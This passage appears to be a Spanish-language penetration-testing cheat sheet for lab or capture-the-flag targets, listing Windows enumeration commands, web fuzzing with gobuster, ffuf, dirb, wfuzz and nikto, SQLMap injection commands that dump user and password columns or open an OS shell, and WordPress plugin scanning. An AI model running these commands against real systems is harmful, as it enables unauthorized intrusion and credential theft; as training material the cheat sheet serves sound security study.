### Red

```bash
> ipconfig
> ipconfig /all
> route print
> netstat -ano
> netstat -nat
> netsh advfirewall show
```

### Procesos

```bash
> wmic service list brief
> tasklist /SVC
> schtasks /query /fo LIST
```

---

## Enumeración Web

Fuzzing de directorios con `gobuster`

```bash
$ gobuster dir -u <URL> -w <WORDLIST>
```

Ejemplo:

```bash
$ gobuster dir -u http://192.168.1.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
```

Fuzzing de directorios con `ffuf`

```bash
$ ffuf -c -u <URL>/FUZZ -w <WORDLIST> -t 20
```

Ejemplo:

```bash
$ ffuf -u http://192.168.1.10/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
```

Fuzzing de directorios con `dirb`

```bash
$ dirb <URL> <WORDLIST>
```

Ejemplo:

```bash
$ dir http://192.168.1.10/ /usr/share/wordlists/dirb/common.txt
```

Fuzzing subdominios con `wfuzz`

```bash
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.target.com' --hw 324 http://target
```

Enumeración con `nikto`

```bash
$ nikto -h URL
```

Ejemplo:

```bash
$ nikto -h http://192.168.1.10/
```

## Explotación Web

#### SQLMap (SQL Injection)

```bash
$ sqlmap -u <URL> -p <PARAMETER> [options]
```

```bash
$ sqlmap -u http://192.168.1.10/index.php?id=10 --dbs                                           # Lista todas las base de datos
$ sqlmap -u http://192.168.1.10/index.php?id=10 -D test --tables                                # Muestra todas las tablas en la base de datos
$ sqlmap -u http://192.168.1.10/index.php?id=10 -D test -T users --columns                      # Lista todas las columnas
$ sqlmap -u http://192.168.1.10/index.php?id=10 -D test -T users -C admin,password,email --dump # Muestra los valores de las columnas indicadas
$ sqlmap -u 'http://192.168.1.10/index.php?id=10' -p id --technique-U                           # Enumera el parámetro id usando la técnica union
$ sqlmap -u 'http://192.168.1.10/index.php?id=31' --dump                                        # Devulve el contenido de la base de datos
$ sqlmap -u 'http://192.168.1.10/index.php?id=7' -os-shell                                      # Lanza un prompt interativo
```

#### Enumeración de plugins Woordpress

##### Nmap

```bash
$ nmap -p80 --script http-wordpress-enum --script-args http-wordpress-enum.root='/wordpress',search-limit=1000 remote.nyx
```

##### Wpscan

```bash
$ wpscan --url <url>
```

##### Nuclei

```bash
$ nuclei -u http://remote.nyx/wordpress/ -tags fuzz -t /home/d4redevil/.local/nuclei-templates/http/fuzzing/wordpress-plugins-detect.yaml
```

##### Fuzzing

```bash
$ gobuster dir -u http://remote.nyx/wordpress/ -w /usr/share/seclists/Discovery/WebContent/CMS/wp-plugins.fuzz.txt
```
